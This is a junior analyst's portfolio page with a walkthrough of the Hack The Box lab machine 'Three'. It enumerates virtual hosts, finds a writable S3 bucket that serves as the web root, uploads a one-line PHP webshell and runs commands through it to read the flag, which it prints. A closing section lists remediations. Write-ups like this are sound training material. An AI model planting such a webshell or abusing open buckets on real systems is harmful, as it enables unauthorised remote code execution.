# 🛡️ Cybersecurity Portfolio — Luca Danisi

> Portfolio pratico per ruoli junior in cybersecurity.  # HTB - Three

**Platform:** Hack The Box — Starting Point, Tier 1  
**OS:** Linux  
**Difficulty:** Very Easy  
**Status:** Pwned ✅

---

## Summary

Three is a Linux machine running a website for a band called "The Toppers". By enumerating virtual hosts, we discover an S3 bucket subdomain that is publicly accessible and writable. We upload a PHP webshell to the bucket, which is served by the web server, giving us remote code execution and allowing us to read the flag.

---

## Tools Used

- `nmap` — port scanning
- `gobuster` — directory and virtual host enumeration
- `awscli` — S3 bucket interaction

---

## Steps

### 1. Port Scanning

```bash
nmap -sC -sV 10.129.51.129
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

Port 80 serves a website called "The Toppers".

### 2. Directory Enumeration

```bash
gobuster dir -u http://10.129.51.129 -w /usr/share/wordlists/dirb/common.txt
```

Nothing interesting found — just `images/` and `index.php`.

### 3. Virtual Host Enumeration

Added the domain to `/etc/hosts`:

```bash
echo "10.129.51.129 thetoppers.htb" | sudo tee -a /etc/hosts
```

Then ran vhost enumeration:

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

Found: `s3.thetoppers.htb`

Added it to `/etc/hosts`:

```bash
echo "10.129.51.129 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

### 4. S3 Bucket Access

Configured awscli with fake credentials (no auth required):

```bash
aws configure
# Access Key: temp / Secret Key: temp / Region: us-east-1
```

Listed the bucket:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

Found the web root files: `index.php`, `.htaccess`, `images/` — the bucket is the actual web server root.

### 5. PHP Webshell Upload

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

### 6. Remote Code Execution

Confirmed RCE:

```
http://thetoppers.htb/shell.php?cmd=id
# uid=33(www-data)
```

Found and read the flag:

```
http://thetoppers.htb/shell.php?cmd=find / -name flag.txt 2>/dev/null
http://thetoppers.htb/shell.php?cmd=cat /var/www/flag.txt
```

---

## What I Learned

- Virtual host enumeration can reveal hidden subdomains not visible from the main site.
- A misconfigured S3 bucket with public write access can lead to full RCE if it serves as the web root.
- awscli works against non-AWS S3-compatible endpoints with fake credentials when no auth is enforced.

---

## Remediation

- Never allow public write access to S3 buckets
- Apply strict bucket policies and disable anonymous access
- Never use an S3 bucket as a directly executable web root

---

## Flag

`a980d99281a28d638ac68b9bf9453c2b`
> Comprende writeup offensivi (HTB) e report difensivi (SOC Analyst).

---
